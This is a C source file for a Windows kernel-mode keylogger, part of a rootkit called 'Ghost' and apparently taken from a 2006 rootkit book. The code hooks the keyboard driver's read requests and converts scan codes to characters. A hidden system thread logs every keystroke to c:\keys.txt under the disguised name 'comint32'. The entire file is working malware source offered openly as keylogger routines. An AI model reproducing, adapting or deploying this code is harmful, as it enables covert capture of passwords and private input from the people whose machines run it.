// keyManager
// Copyright Ric Vieler, 2006
// Keylogger routines

#include "ntddk.h"
#include "Ghost.h"
#include "keyManager.h"
#include "ntddkbd.h"

extern KEYBOARD_STRUCT keyboardData;
extern PDEVICE_OBJECT oldKeyboardDevice;

char keyMap[84] = {NUL,NUL,'1','2','3','4','5','6','7','8',
 '9','0','-','=',NUL,NUL,'q','w','e','r',
 't','y','u','i','o','p','[',']',ENTER,CTRL,
 'a','s','d','f','g','h','j','k','l',';',
 '\'','`',LSHIFT,'\\','z','x','c','v','b','n',
 'm',',','.','/',RSHIFT,NUL,ALT,SPACE,NUL,NUL,
 NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,
 NUL,'7','8','9',NUL,'4','5','6',NUL,'1',
 '2','3','0'};

char shiftKeyMap[84] = {NUL,NUL,'!','@','#','$','%','^','&','*',
 '(',')','_','+',NUL,NUL,'Q','W','E','R',
 'T','Y','U','I','O','P','{','}',ENTER,NUL,
 'A','S','D','F','G','H','J','K','L',':',
 '"','~',LSHIFT,'|','Z','X','C','V','B','N',
 'M','<','>','?',RSHIFT,NUL,NUL,SPACE,NUL,NUL,
 NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,
 NUL,'7','8','9',NUL,'4','5','6',NUL,'1',
 '2','3','0'};

NTSTATUS OnKeyboardRead( PDEVICE_OBJECT pDeviceObject,
	PIRP Irp,
	PIO_STACK_LOCATION irpStack )
{
	NTSTATUS status;
	PIRP newIrp;
	PIO_STACK_LOCATION newirpStack;

	// create new irp
	newIrp = IoAllocateIrp( pDeviceObject->StackSize, FALSE );
	IoSetNextIrpStackLocation( newIrp );
	newirpStack = IoGetCurrentIrpStackLocation( newIrp );
	newIrp->AssociatedIrp.SystemBuffer = Irp->AssociatedIrp.SystemBuffer;
	newIrp->RequestorMode = KernelMode;   // Irp->RequestorMode;
	newIrp->Tail.Overlay.Thread = Irp->Tail.Overlay.Thread;
	newIrp->Tail.Overlay.OriginalFileObject = Irp->Tail.Overlay.OriginalFileObject;
	newIrp->Flags = Irp->Flags;
	newirpStack->MajorFunction = IRP_MJ_READ;
	newirpStack->MinorFunction = irpStack->MinorFunction;
	newirpStack->Parameters.Read = irpStack->Parameters.Read;
	newirpStack->DeviceObject = pDeviceObject;
	newirpStack->FileObject = irpStack->FileObject;
	newirpStack->Flags = irpStack->Flags;
	newirpStack->Control = 0;
	IoCopyCurrentIrpStackLocationToNext( newIrp );
	IoSetCompletionRoutine( newIrp, OnReadCompletion, Irp, TRUE, TRUE, TRUE );

	// save old irp
	Irp->Tail.Overlay.DriverContext[0] = newIrp;
	ExInterlockedInsertHeadList( &keyboardData.irpList,
		&Irp->Tail.Overlay.ListEntry,
		&keyboardData.irpLock );

	// set cancel routine to allow driver to unload
	IoSetCancelRoutine( Irp, OnCancel );

	// pass new irp in place of old irp
	status = IoCallDriver( oldKeyboardDevice, newIrp );
	if( status == STATUS_PENDING )
		return status;

	status = Irp->IoStatus.Status;
	IoCompleteRequest( Irp, IO_KEYBOARD_INCREMENT );
	return status;
}    

NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject,
	IN PIRP pIrp,
	IN PVOID Context)
{
	PIRP origIrp;
	KIRQL aIrqL;
	BOOL found = FALSE;

	if( pIrp->Cancel )
	{
		// driver unloading
		IoFreeIrp( pIrp );
		return STATUS_MORE_PROCESSING_REQUIRED;
	}

	// get original irp
	origIrp = (PIRP)Context;

	// find and delete the original irp
	KeAcquireSpinLock( &keyboardData.irpLock, &aIrqL );
	{
		PLIST_ENTRY listEntry;
		listEntry = keyboardData.irpList.Flink;
		while( (listEntry != &origIrp->Tail.Overlay.ListEntry)
			&& (listEntry != &keyboardData.irpList) )
		{
			listEntry = listEntry->Flink;
		}
		found = (listEntry == &origIrp->Tail.Overlay.ListEntry);
		if( found )
			RemoveEntryList( &origIrp->Tail.Overlay.ListEntry );
	}
	KeReleaseSpinLock( &keyboardData.irpLock, aIrqL );

	// propagate irp if pending
	if( pIrp->PendingReturned )
	{
		IoMarkIrpPending( pIrp );
		if( found )
			IoMarkIrpPending( origIrp );
	}

	// process the key
	if( pIrp->IoStatus.Status == STATUS_SUCCESS )
	{
		int i;
		int numKeys;
		PKEYBOARD_INPUT_DATA keys;
		KEY_DATA* keyData;

		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for( i = 0; i < numKeys; i++ )
		{
			// get key
			keyData = (KEY_DATA*)ExAllocatePool( NonPagedPool, sizeof(KEY_DATA) );
			keyData->KeyData = (char)keys[i].MakeCode;
			keyData->KeyFlags = (char)keys[i].Flags;

			// give key to key queue
			ExInterlockedInsertTailList( &keyboardData.keyList,
				&keyData->ListEntry,
				&keyboardData.keyLock );

			// tell logging thread to read key queue
			KeReleaseSemaphore( &keyboardData.keySemaphore, 0, 1, FALSE );
		}
	}
	if( found )
	{
		// complete the orig irp
		origIrp->IoStatus.Status = pIrp->IoStatus.Status;
		origIrp->IoStatus.Information = pIrp->IoStatus.Information;
		IoSetCancelRoutine( origIrp, NULL );
		if( pIrp->PendingReturned )
			IoCompleteRequest( origIrp, IO_KEYBOARD_INCREMENT );
	}
	// free the new irp
	IoFreeIrp( pIrp );

	return STATUS_MORE_PROCESSING_REQUIRED;
}

void GetKey(KEY_DATA* keyData, char* key)
{
	 char mappedKey;

	 // map the key code into a key
	 mappedKey = keyMap[keyData->KeyData];
	 
	 // process mapped key
	 switch( mappedKey )
	 {
		case CTRL:
			if( keyData->KeyFlags == KEY_MAKE )
				keyboardData.keyState.CtrlKey = TRUE;
			else
				keyboardData.keyState.CtrlKey = FALSE;
			break;
		 
		case ALT:
			if( keyData->KeyFlags == KEY_MAKE )
				keyboardData.keyState.AltKey = TRUE;
			else
				keyboardData.keyState.AltKey = FALSE;
			break;

		case LSHIFT:
			if( keyData->KeyFlags == KEY_MAKE )
				keyboardData.keyState.ShiftKey = TRUE;
			else
				keyboardData.keyState.ShiftKey = FALSE;
			break;

		case RSHIFT:
			if( keyData->KeyFlags == KEY_MAKE )
				keyboardData.keyState.ShiftKey = TRUE;
			else
				keyboardData.keyState.ShiftKey = FALSE;
			break;

		case ENTER:
			if(( keyboardData.keyState.AltKey != TRUE ) &&
				( keyData->KeyFlags == KEY_BREAK )) 
			{
				key[0] = 0x0D;
				key[1] = 0x0A;
			}
			break;

		case SPACE: 
			if(( keyboardData.keyState.AltKey != TRUE ) &&
				( keyData->KeyFlags == KEY_BREAK ))
				key[0] = 0x20;
			break;

		default:
			if(( keyboardData.keyState.AltKey != TRUE ) &&
				( keyboardData.keyState.CtrlKey != TRUE ) &&
				( keyData->KeyFlags == KEY_BREAK ))
			{
				if(( mappedKey >= 0x21 ) && ( mappedKey <= 0x7E ))
				{
					if( keyboardData.keyState.ShiftKey == TRUE )
						key[0] = shiftKeyMap[keyData->KeyData];
					else  
						key[0] = mappedKey;
				}
			}
			break;
	 }
}

NTSTATUS InitializeLogThread(IN PDRIVER_OBJECT pDriverObject)
{
	HANDLE hThread; 
	NTSTATUS status;

	keyboardData.terminateFlag = FALSE;
	status	= PsCreateSystemThread( &hThread,
		(ACCESS_MASK)0,
		NULL,
		(HANDLE)0,
		NULL,
		KeyLoggerThread,
		NULL );

	if( !NT_SUCCESS( status ) )
	{
		DbgPrint("comint32: Failed to create key log thread");
		return status;
	}

	ObReferenceObjectByHandle( hThread,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode, 
		(PVOID*)&keyboardData.threadObject,
		NULL );

	ZwClose( hThread );
	
	return status;
}

VOID KeyLoggerThread(PVOID StartContext)
{
	char key[3];
	NTSTATUS status;
	PLIST_ENTRY pListEntry;
	KEY_DATA* keyData;

	while( TRUE )
	{
		// wait for a key
		KeWaitForSingleObject( &keyboardData.keySemaphore,
			Executive,
			KernelMode,
			FALSE,
			NULL );	

		pListEntry = ExInterlockedRemoveHeadList( &keyboardData.keyList,
			&keyboardData.keyLock );
		
		if( keyboardData.terminateFlag == TRUE )
			PsTerminateSystemThread( STATUS_SUCCESS );
		
		// get base address of instance 
		keyData = CONTAINING_RECORD( pListEntry, KEY_DATA, ListEntry );

		// convert scan code to key
		key[0] = key[1] = key[2] = 0;
		GetKey( keyData, key );

		if( key[0] != 0 )
		{
			if(keyboardData.hLogFile != NULL)
			{	
				IO_STATUS_BLOCK io_status;
			    
				status = ZwWriteFile(keyboardData.hLogFile,
					NULL,
					NULL,
					NULL,
					&io_status,
					&key,
					strlen(key),
					NULL,
					NULL);
			}
		}	
	}
	return;
}

void StartKeylogger(PDRIVER_OBJECT pDriverObject)
{
	IO_STATUS_BLOCK statusBlock;
	OBJECT_ATTRIBUTES attributes;
    STRING ansiName;
	UNICODE_STRING unicodeName;
	CCHAR asciiName[64] = "\\DosDevices\\c:\\keys.txt";

	// initialize keyboardData
	InitializeLogThread( pDriverObject );
	InitializeListHead( &keyboardData.keyList );
	KeInitializeSpinLock( &keyboardData.keyLock );
	KeInitializeSemaphore( &keyboardData.keySemaphore, 0 , MAXLONG );
	InitializeListHead( &keyboardData.irpList );
	KeInitializeSpinLock( &keyboardData.irpLock );

	// create key log
    RtlInitAnsiString( &ansiName, asciiName );
    RtlAnsiStringToUnicodeString( &unicodeName, &ansiName, TRUE );
	InitializeObjectAttributes( &attributes,
		&unicodeName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL );
	ZwCreateFile( &keyboardData.hLogFile,
		FILE_APPEND_DATA,
		&attributes,
		&statusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0 );
	RtlFreeUnicodeString( &unicodeName );

	DbgPrint("comint32: Log thread started");
}

void StopKeylogger( PDEVICE_OBJECT* ppOldDevice,
	PDEVICE_OBJECT* ppNewDevice )
{
	KIRQL irql;
	LIST_ENTRY forwarding_list;

	IoDetachDevice( *ppOldDevice );
	InitializeListHead( &forwarding_list );
	// cancel pending irps
	KeAcquireSpinLock( &keyboardData.irpLock, &irql );
	{
		PLIST_ENTRY listEntry;
		listEntry = keyboardData.irpList.Flink;
		while( listEntry != &keyboardData.irpList )
		{
			PIRP newIrp, Irp;

			Irp = (PIRP)(CONTAINING_RECORD( listEntry, IRP, Tail.Overlay.ListEntry ));
			newIrp = (PIRP)(Irp->Tail.Overlay.DriverContext[0]);
			// must advance listEntry before unlinking
			listEntry = listEntry->Flink;
			if( newIrp )
			{
				// cancel created irp
				if( IoCancelIrp( newIrp ) )
				{
					// add original irp to forwarding list
					Irp->Tail.Overlay.DriverContext[0] = NULL;
					IoSetCancelRoutine( Irp, NULL );
					RemoveEntryList( &Irp->Tail.Overlay.ListEntry );
					InsertHeadList( &forwarding_list, &Irp->Tail.Overlay.ListEntry );
				}
			}
		}
	}
	KeReleaseSpinLock( &keyboardData.irpLock, irql );
	// forward original irps
	while( !IsListEmpty( &forwarding_list ) )
	{
		PLIST_ENTRY listEntry;
		PIRP Irp;

		listEntry = RemoveHeadList( &forwarding_list );
		Irp = (PIRP)(CONTAINING_RECORD( listEntry, IRP, Tail.Overlay.ListEntry ));
		IoSkipCurrentIrpStackLocation( Irp );
		IoCallDriver( oldKeyboardDevice, Irp );
	}
	// delete keyboard device
	IoDeleteDevice( *ppNewDevice );

	// terminate logging thread
	keyboardData.terminateFlag = TRUE;
	KeReleaseSemaphore( &keyboardData.keySemaphore, 0, 1, TRUE);
	KeWaitForSingleObject( keyboardData.threadObject,
			Executive,
			KernelMode,
			FALSE,
			NULL);

	// close key log file
	ZwClose( keyboardData.hLogFile );

	DbgPrint("comint32: Log thread stopped");
}

void OnCancel( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	PIRP newIrp;
	KIRQL irql;
	PLIST_ENTRY listEntry;
	int found = FALSE;

	IoSetCancelRoutine( Irp, NULL );
	IoReleaseCancelSpinLock( Irp->CancelIrql );

	// remove associated irp
	KeAcquireSpinLock( &keyboardData.irpLock, &irql );
	{
		listEntry = keyboardData.irpList.Flink;
		while( (listEntry != &Irp->Tail.Overlay.ListEntry)
			&& (listEntry != &keyboardData.irpList) )
		{
			listEntry = listEntry->Flink;
		}
		found = ( listEntry == &Irp->Tail.Overlay.ListEntry );
		if( found )
			RemoveEntryList( &Irp->Tail.Overlay.ListEntry );
	}
	KeReleaseSpinLock( &keyboardData.irpLock, irql );

	// process cancellation
	Irp->IoStatus.Status = STATUS_CANCELLED;
	Irp->IoStatus.Information = 0;
	newIrp = (PIRP)Irp->Tail.Overlay.DriverContext[0];
	IoCompleteRequest( Irp, IO_KEYBOARD_INCREMENT );
	if( newIrp )
		IoCancelIrp( newIrp );

	return;
}
